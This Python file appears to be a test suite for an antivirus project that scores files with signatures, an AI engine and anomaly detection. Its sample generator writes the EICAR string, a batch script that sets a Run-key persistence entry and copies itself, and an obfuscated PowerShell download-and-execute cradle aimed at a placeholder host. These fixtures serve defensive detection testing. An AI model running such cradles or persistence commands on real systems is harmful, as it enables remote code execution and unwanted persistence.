#!/usr/bin/env python3
"""
Comprehensive Testing Suite for AI Antivirus
Automated testing for all components and integrations
"""

import os
import sys
import time
import json
import sqlite3
import logging
import unittest
import threading
import tempfile
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path
import subprocess

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

class TestDataGenerator:
    """Generate test data for various testing scenarios"""
    
    def __init__(self):
        self.test_data_dir = os.path.join(os.path.dirname(__file__), "test_data")
        os.makedirs(self.test_data_dir, exist_ok=True)
        try:
            from .comprehensive_logger import setup_module_logging
            self.logger = setup_module_logging('ai_antivirus.testing.comprehensive_test_suite')
        except ImportError:
            self.logger = logging.getLogger(__name__)
    
    def create_test_files(self) -> Dict[str, str]:
        """Create various test files for scanning"""
        test_files = {}
        
        try:
            # Clean test file
            clean_file = os.path.join(self.test_data_dir, "clean_test.txt")
            with open(clean_file, 'w') as f:
                f.write("This is a clean test file for antivirus testing.\n")
                f.write("It contains no malicious content.\n")
            test_files['clean'] = clean_file
            
            # Suspicious test file (EICAR-like)
            eicar_file = os.path.join(self.test_data_dir, "eicar_test.txt")
            with open(eicar_file, 'w') as f:
                f.write("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            test_files['eicar'] = eicar_file
            
            # Large file for performance testing
            large_file = os.path.join(self.test_data_dir, "large_test.bin")
            with open(large_file, 'wb') as f:
                f.write(b'A' * (10 * 1024 * 1024))  # 10MB file
            test_files['large'] = large_file
            
            # Binary executable (harmless)
            exe_file = os.path.join(self.test_data_dir, "test_executable.exe")
            with open(exe_file, 'wb') as f:
                # Simple PE header structure
                f.write(b'MZ\x90\x00' + b'\x00' * 60 + b'PE\x00\x00')
                f.write(b'\x00' * 1000)
            test_files['executable'] = exe_file
            
            # Archive file
            archive_file = os.path.join(self.test_data_dir, "test_archive.zip")
            try:
                import zipfile
                with zipfile.ZipFile(archive_file, 'w') as zf:
                    zf.writestr("readme.txt", "This is a test archive file.")
                test_files['archive'] = archive_file
            except ImportError:
                pass
            
            # Script file
            script_file = os.path.join(self.test_data_dir, "test_script.ps1")
            with open(script_file, 'w') as f:
                f.write("# PowerShell test script\n")
                f.write("Write-Host 'This is a test script'\n")
            test_files['script'] = script_file
            
            return test_files
            
        except Exception as e:
            self.logger.error(f"Failed to create test files: {e}")
            return {}
    
    def create_threat_samples(self) -> Dict[str, str]:
        """Create simulated threat samples for testing"""
        threat_samples = {}
        
        try:
            # Simulated malware sample
            malware_file = os.path.join(self.test_data_dir, "malware_sample.bin")
            with open(malware_file, 'wb') as f:
                # Create suspicious binary patterns
                f.write(b'\x4d\x5a\x90\x00')  # PE header
                f.write(b'\x00' * 100)
                f.write(b'CreateFileA\x00')  # Suspicious API
                f.write(b'WriteFile\x00')
                f.write(b'RegSetValueEx\x00')
                f.write(b'\x00' * 500)
            threat_samples['malware'] = malware_file
            
            # Suspicious script
            script_threat = os.path.join(self.test_data_dir, "suspicious_script.bat")
            with open(script_threat, 'w') as f:
                f.write("@echo off\n")
                f.write("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n")
                f.write("copy %0 %temp%\\system32.exe\n")
            threat_samples['script_threat'] = script_threat
            
            # Obfuscated PowerShell
            ps_threat = os.path.join(self.test_data_dir, "obfuscated.ps1")
            with open(ps_threat, 'w') as f:
                f.write("$a='IEX';$b='(New-Object Net.WebClient)';")
                f.write("$c='.DownloadString';Invoke-Expression($a+$b+$c+'(\"http://malicious.com\")')")
            threat_samples['powershell_threat'] = ps_threat
            
            return threat_samples
            
        except Exception as e:
            self.logger.error(f"Failed to create threat samples: {e}")
            return {}

class ComponentTester:
    """Test individual AI Antivirus components"""
    
    def __init__(self):
        try:
            from .comprehensive_logger import setup_module_logging
            self.logger = setup_module_logging('ai_antivirus.testing.comprehensive_test_suite')
        except ImportError:
            self.logger = logging.getLogger(__name__)
        self.test_results = {}
    
    def test_signature_engine(self) -> Dict[str, Any]:
        """Test signature-based detection engine"""
        try:
            from core.signature_engine import SignatureEngine
            
            # Initialize signature engine
            signature_engine = SignatureEngine()
            
            # Test signature loading
            signature_count = signature_engine.get_signature_count()
            
            # Test file scanning
            test_generator = TestDataGenerator()
            test_files = test_generator.create_test_files()
            
            results = {
                'component': 'signature_engine',
                'status': 'passed',
                'signature_count': signature_count,
                'scan_results': {}
            }
            
            for file_type, file_path in test_files.items():
                if os.path.exists(file_path):
                    scan_result = signature_engine.check_file_signature(file_path)
                    results['scan_results'][file_type] = {
                        'file_path': file_path,
                        'is_threat': scan_result.get('is_threat', False),
                        'detection_method': scan_result.get('detection_method', 'unknown')
                    }
            
            self.test_results['signature_engine'] = results
            return results
            
        except Exception as e:
            self.logger.error(f"Signature engine test failed: {e}")
            return {
                'component': 'signature_engine',
                'status': 'failed',
                'error': str(e)
            }
    
    def test_ai_engine(self) -> Dict[str, Any]:
        """Test AI-based detection engine"""
        try:
            from core.ai_engine import AIEngine
            
            # Initialize AI engine
            ai_engine = AIEngine()
            
            # Test AI model loading
            model_loaded = hasattr(ai_engine, 'model') and ai_engine.model is not None
            
            # Test file classification
            test_generator = TestDataGenerator()
            test_files = test_generator.create_test_files()
            threat_samples = test_generator.create_threat_samples()
            
            results = {
                'component': 'ai_engine',
                'status': 'passed',
                'model_loaded': model_loaded,
                'classification_results': {}
            }
            
            # Test clean files
            for file_type, file_path in test_files.items():
                if os.path.exists(file_path):
                    classification = ai_engine.classify_file_access(file_path, "test_process")
                    results['classification_results'][f'clean_{file_type}'] = {
                        'file_path': file_path,
                        'threat_score': classification.get('threat_score', 0.0),
                        'is_threat': classification.get('is_threat', False)
                    }
            
            # Test threat samples
            for threat_type, file_path in threat_samples.items():
                if os.path.exists(file_path):
                    classification = ai_engine.classify_file_access(file_path, "test_process")
                    results['classification_results'][f'threat_{threat_type}'] = {
                        'file_path': file_path,
                        'threat_score': classification.get('threat_score', 0.0),
                        'is_threat': classification.get('is_threat', False)
                    }
            
            self.test_results['ai_engine'] = results
            return results
            
        except Exception as e:
            self.logger.error(f"AI engine test failed: {e}")
            return {
                'component': 'ai_engine',
                'status': 'failed',
                'error': str(e)
            }
    
    def test_anomaly_detector(self) -> Dict[str, Any]:
        """Test anomaly detection system"""
        try:
            from detection.anomaly_detector import EnhancedAnomalyDetector
            
            # Initialize anomaly detector
            anomaly_detector = EnhancedAnomalyDetector()
            
            # Test anomaly detection
            test_generator = TestDataGenerator()
            threat_samples = test_generator.create_threat_samples()
            
            results = {
                'component': 'anomaly_detector',
                'status': 'passed',
                'detection_results': {}
            }
            
            for threat_type, file_path in threat_samples.items():
                if os.path.exists(file_path):
                    detection = anomaly_detector.analyze_file(file_path)
                    results['detection_results'][threat_type] = {
                        'file_path': file_path,
                        'anomaly_score': detection.get('anomaly_score', 0.0),
                        'is_anomalous': detection.get('is_anomalous', False),
                        'anomaly_reasons': detection.get('anomaly_reasons', [])
                    }
            
            self.test_results['anomaly_detector'] = results
            return results
            
        except Exception as e:
            self.logger.error(f"Anomaly detector test failed: {e}")
            return {
                'component': 'anomaly_detector',
                'status': 'failed',
                'error': str(e)
            }
    
    def test_threat_intelligence(self) -> Dict[str, Any]:
        """Test threat intelligence system"""
        try:
            from intelligence.threat_intelligence_engine import ThreatIntelligenceEngine
            
            # Initialize threat intelligence
            intel_engine = ThreatIntelligenceEngine()
            
            # Test intelligence feeds
            feed_status = intel_engine.get_feed_status()
            
            # Test threat lookup
            test_hash = "d41d8cd98f00b204e9800998ecf8427e"  # MD5 of empty string
            threat_info = intel_engine.lookup_threat(test_hash)
            
            results = {
                'component': 'threat_intelligence',
                'status': 'passed',
                'feed_status': feed_status,
                'threat_lookup': {
                    'test_hash': test_hash,
                    'threat_found': threat_info.get('threat_found', False),
                    'confidence': threat_info.get('confidence', 0.0)
                }
            }
            
            self.test_results['threat_intelligence'] = results
            return results
            
        except Exception as e:
            self.logger.error(f"Threat intelligence test failed: {e}")
            return {
                'component': 'threat_intelligence',
                'status': 'failed',
                'error': str(e)
            }

class IntegrationTester:
    """Test component integrations and workflows"""
    
    def __init__(self):
        try:
            from .comprehensive_logger import setup_module_logging
            self.logger = setup_module_logging('ai_antivirus.testing.comprehensive_test_suite')
        except ImportError:
            self.logger = logging.getLogger(__name__)
        self.test_results = {}
    
    def test_scanning_workflow(self) -> Dict[str, Any]:
        """Test complete scanning workflow"""
        try:
            from enhanced_quick_scan_system import CriticalSystemScanner
            from core.signature_engine import SignatureEngine
            from core.ai_engine import AIEngine
            from detection.anomaly_detector import EnhancedAnomalyDetector
            
            # Initialize components
            signature_engine = SignatureEngine()
            ai_engine = AIEngine()
            anomaly_detector = EnhancedAnomalyDetector()
            
            # Initialize scanner
            scanner = CriticalSystemScanner(
                signature_engine=signature_engine,
                ai_engine=ai_engine,
                anomaly_detector=anomaly_detector
            )
            
            # Test file scanning
            test_generator = TestDataGenerator()
            test_files = test_generator.create_test_files()
            
            results = {
                'test': 'scanning_workflow',
                'status': 'passed',
                'scan_results': {}
            }
            
            for file_type, file_path in test_files.items():
                if os.path.exists(file_path):
                    scan_result = scanner.scan_single_file(file_path)
                    results['scan_results'][file_type] = {
                        'file_path': file_path,
                        'threat_detected': scan_result.get('threat_detected', False),
                        'detection_methods': scan_result.get('detection_methods', []),
                        'threat_score': scan_result.get('threat_score', 0.0)
                    }
            
            self.test_results['scanning_workflow'] = results
            return results
            
        except Exception as e:
            self.logger.error(f"Scanning workflow test failed: {e}")
            return {
                'test': 'scanning_workflow',
                'status': 'failed',
                'error': str(e)
            }
    
    def test_threat_sharing_integration(self) -> Dict[str, Any]:
        """Test threat sharing network integration"""
        try:
            from network.threat_sharing_network import ThreatSharingNetwork
            from network.p2p_threat_exchange import P2PThreatExchange
            
            # Initialize sharing components
            sharing_network = ThreatSharingNetwork()
            p2p_exchange = P2PThreatExchange()
            
            # Test threat sharing
            test_threat = {
                'file_hash': 'test_hash_123',
                'threat_name': 'Test.Threat',
                'threat_level': 'high',
                'detection_time': datetime.now().isoformat(),
                'source': 'test_system'
            }
            
            # Share threat
            sharing_result = sharing_network.share_threat(test_threat)
            
            results = {
                'test': 'threat_sharing_integration',
                'status': 'passed',
                'sharing_result': sharing_result,
                'p2p_status': p2p_exchange.get_status() if hasattr(p2p_exchange, 'get_status') else 'unknown'
            }
            
            self.test_results['threat_sharing_integration'] = results
            return results
            
        except Exception as e:
            self.logger.error(f"Threat sharing integration test failed: {e}")
            return {
                'test': 'threat_sharing_integration',
                'status': 'failed',
                'error': str(e)
            }

class PerformanceTester:
    """Test system performance and resource usage"""
    
    def __init__(self):
        try:
            from .comprehensive_logger import setup_module_logging
            self.logger = setup_module_logging('ai_antivirus.testing.comprehensive_test_suite')
        except ImportError:
            self.logger = logging.getLogger(__name__)
        self.test_results = {}
    
    def test_scanning_performance(self) -> Dict[str, Any]:
        """Test scanning performance with various file sizes"""
        try:
            import psutil
            from enhanced_quick_scan_system import CriticalSystemScanner
            from core.signature_engine import SignatureEngine
            from core.ai_engine import AIEngine
            
            # Initialize components
            signature_engine = SignatureEngine()
            ai_engine = AIEngine()
            
            scanner = CriticalSystemScanner(
                signature_engine=signature_engine,
                ai_engine=ai_engine,
                anomaly_detector=None
            )
            
            # Create test files of different sizes
            test_files = {}
            sizes = [1024, 10*1024, 100*1024, 1024*1024]  # 1KB, 10KB, 100KB, 1MB
            
            for size in sizes:
                file_path = os.path.join(tempfile.gettempdir(), f"perf_test_{size}.bin")
                with open(file_path, 'wb') as f:
                    f.write(b'A' * size)
                test_files[f"{size}_bytes"] = file_path
            
            results = {
                'test': 'scanning_performance',
                'status': 'passed',
                'performance_metrics': {}
            }
            
            # Test scanning performance
            for size_label, file_path in test_files.items():
                # Measure performance
                process = psutil.Process()
                cpu_before = process.cpu_percent()
                memory_before = process.memory_info().rss
                
                start_time = time.time()
                scan_result = scanner.scan_single_file(file_path)
                end_time = time.time()
                
                cpu_after = process.cpu_percent()
                memory_after = process.memory_info().rss
                
                results['performance_metrics'][size_label] = {
                    'file_size': os.path.getsize(file_path),
                    'scan_time': end_time - start_time,
                    'cpu_usage': cpu_after - cpu_before,
                    'memory_delta': memory_after - memory_before,
                    'threat_detected': scan_result.get('threat_detected', False)
                }
                
                # Clean up
                try:
                    os.remove(file_path)
                except:
                    pass
            
            self.test_results['scanning_performance'] = results
            return results
            
        except Exception as e:
            self.logger.error(f"Performance test failed: {e}")
            return {
                'test': 'scanning_performance',
                'status': 'failed',
                'error': str(e)
            }

class ComprehensiveTestSuite:
    """Main test suite coordinator"""
    
    def __init__(self):
        try:
            from .comprehensive_logger import setup_module_logging
            self.logger = setup_module_logging('ai_antivirus.testing.comprehensive_test_suite')
        except ImportError:
            self.logger = logging.getLogger(__name__)
        self.setup_logging()
        
        self.component_tester = ComponentTester()
        self.integration_tester = IntegrationTester()
        self.performance_tester = PerformanceTester()
        
        self.test_results = {}
        self.test_report = {}
    
    def setup_logging(self):
        """Setup test logging"""
        log_file = os.path.join(os.path.dirname(__file__), "test_results.log")
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
    
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all test suites"""
        self.logger.info("Starting comprehensive test suite")
        
        start_time = time.time()
        
        # Component tests
        self.logger.info("Running component tests...")
        component_results = self.run_component_tests()
        
        # Integration tests
        self.logger.info("Running integration tests...")
        integration_results = self.run_integration_tests()
        
        # Performance tests
        self.logger.info("Running performance tests...")
        performance_results = self.run_performance_tests()
        
        end_time = time.time()
        
        # Compile test report
        self.test_report = {
            'test_suite': 'comprehensive_ai_antivirus_tests',
            'execution_time': end_time - start_time,
            'timestamp': datetime.now().isoformat(),
            'component_tests': component_results,
            'integration_tests': integration_results,
            'performance_tests': performance_results,
            'summary': self.generate_test_summary()
        }
        
        # Save test report
        self.save_test_report()
        
        self.logger.info(f"Test suite completed in {end_time - start_time:.2f} seconds")
        
        return self.test_report
    
    def run_component_tests(self) -> Dict[str, Any]:
        """Run all component tests"""
        results = {}
        
        try:
            results['signature_engine'] = self.component_tester.test_signature_engine()
            results['ai_engine'] = self.component_tester.test_ai_engine()
            results['anomaly_detector'] = self.component_tester.test_anomaly_detector()
            results['threat_intelligence'] = self.component_tester.test_threat_intelligence()
        except Exception as e:
            self.logger.error(f"Component tests failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def run_integration_tests(self) -> Dict[str, Any]:
        """Run all integration tests"""
        results = {}
        
        try:
            results['scanning_workflow'] = self.integration_tester.test_scanning_workflow()
            results['threat_sharing'] = self.integration_tester.test_threat_sharing_integration()
        except Exception as e:
            self.logger.error(f"Integration tests failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def run_performance_tests(self) -> Dict[str, Any]:
        """Run all performance tests"""
        results = {}
        
        try:
            results['scanning_performance'] = self.performance_tester.test_scanning_performance()
        except Exception as e:
            self.logger.error(f"Performance tests failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def generate_test_summary(self) -> Dict[str, Any]:
        """Generate test execution summary"""
        summary = {
            'total_tests': 0,
            'passed_tests': 0,
            'failed_tests': 0,
            'test_categories': {
                'component_tests': {'total': 0, 'passed': 0, 'failed': 0},
                'integration_tests': {'total': 0, 'passed': 0, 'failed': 0},
                'performance_tests': {'total': 0, 'passed': 0, 'failed': 0}
            }
        }
        
        # Count component tests
        component_tests = self.test_report.get('component_tests', {})
        for test_name, test_result in component_tests.items():
            if test_name != 'error':
                summary['test_categories']['component_tests']['total'] += 1
                if test_result.get('status') == 'passed':
                    summary['test_categories']['component_tests']['passed'] += 1
                else:
                    summary['test_categories']['component_tests']['failed'] += 1
        
        # Count integration tests
        integration_tests = self.test_report.get('integration_tests', {})
        for test_name, test_result in integration_tests.items():
            if test_name != 'error':
                summary['test_categories']['integration_tests']['total'] += 1
                if test_result.get('status') == 'passed':
                    summary['test_categories']['integration_tests']['passed'] += 1
                else:
                    summary['test_categories']['integration_tests']['failed'] += 1
        
        # Count performance tests
        performance_tests = self.test_report.get('performance_tests', {})
        for test_name, test_result in performance_tests.items():
            if test_name != 'error':
                summary['test_categories']['performance_tests']['total'] += 1
                if test_result.get('status') == 'passed':
                    summary['test_categories']['performance_tests']['passed'] += 1
                else:
                    summary['test_categories']['performance_tests']['failed'] += 1
        
        # Calculate totals
        for category in summary['test_categories'].values():
            summary['total_tests'] += category['total']
            summary['passed_tests'] += category['passed']
            summary['failed_tests'] += category['failed']
        
        summary['success_rate'] = (summary['passed_tests'] / summary['total_tests'] * 100) if summary['total_tests'] > 0 else 0
        
        return summary
    
    def save_test_report(self):
        """Save test report to file"""
        try:
            report_file = os.path.join(os.path.dirname(__file__), f"test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            
            with open(report_file, 'w') as f:
                json.dump(self.test_report, f, indent=2, default=str)
            
            self.logger.info(f"Test report saved to: {report_file}")
            
        except Exception as e:
            self.logger.error(f"Failed to save test report: {e}")

def main():
    """Main test execution function"""
    print("🧪 AI Antivirus Comprehensive Test Suite")
    print("=" * 50)
    
    # Initialize and run test suite
    test_suite = ComprehensiveTestSuite()
    results = test_suite.run_all_tests()
    
    # Print summary
    summary = results.get('summary', {})
    print(f"\n📊 Test Results Summary:")
    print(f"Total Tests: {summary.get('total_tests', 0)}")
    print(f"Passed: {summary.get('passed_tests', 0)}")
    print(f"Failed: {summary.get('failed_tests', 0)}")
    print(f"Success Rate: {summary.get('success_rate', 0):.1f}%")
    print(f"Execution Time: {results.get('execution_time', 0):.2f} seconds")
    
    return results

if __name__ == "__main__":
    main()
